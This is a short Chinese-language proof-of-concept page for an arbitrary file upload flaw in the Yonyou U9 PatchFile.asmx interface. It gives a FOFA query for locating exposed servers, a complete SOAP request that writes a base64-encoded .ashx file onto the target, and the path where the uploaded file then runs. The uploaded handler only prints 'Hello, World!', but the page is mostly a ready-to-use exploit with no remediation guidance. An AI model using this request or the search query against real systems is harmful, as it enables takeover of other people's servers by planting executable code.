## 用友-U9-PatchFile.asmx任意文件上传漏洞

用友 U9 PatchFile.asmx 接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。

## fofa

```
body="logo-u9.png"
```

## poc

```
POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0
Content-Length: 898
Content-Type: text/xml; charset=utf-8
Soapaction: "http://tempuri.org/SaveFile"
Accept-Encoding: gzip, deflate, br
Connection: close

<?xml version="1.0" encoding="utf-8"?>
 <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
   <SaveFile xmlns="http://tempuri.org/">
    <binData>PCVAIFdlYkhhbmRsZXIgTGFuZ3VhZ2U9IkMjIiBDbGFzcz0iSGVsbG9Xb3JsZEhhbmRsZXIiICU+Cgp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5XZWI7CgpwdWJsaWMgY2xhc3MgSGVsbG9Xb3JsZEhhbmRsZXIgOiBJSHR0cEhhbmRsZXIKewogICAgcHVibGljIHZvaWQgUHJvY2Vzc1JlcXVlc3QoSHR0cENvbnRleHQgY29udGV4dCkKICAgIHsKICAgICAgICBjb250ZXh0LlJlc3BvbnNlLkNvbnRlbnRUeXBlID0gInRleHQvcGxhaW4iOwogICAgICAgIGNvbnRleHQuUmVzcG9uc2UuV3JpdGUoIkhlbGxvLCBXb3JsZCEiKTsKICAgIH0KCiAgICBwdWJsaWMgYm9vbCBJc1JldXNhYmxlCiAgICB7CiAgICAgICAgZ2V0IHsgcmV0dXJuIGZhbHNlOyB9CiAgICB9Cn0=</binData>
    <path>./</path>
    <fileName>bTRkH1.ashx</fileName>
   </SaveFile>
  </soap:Body>
 </soap:Envelope>
```

![image-20240607192040364](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406071920424.png)

路径：`http://127.0.0.1/CS/Office/AutoUpdates/bTRkH1.ashx`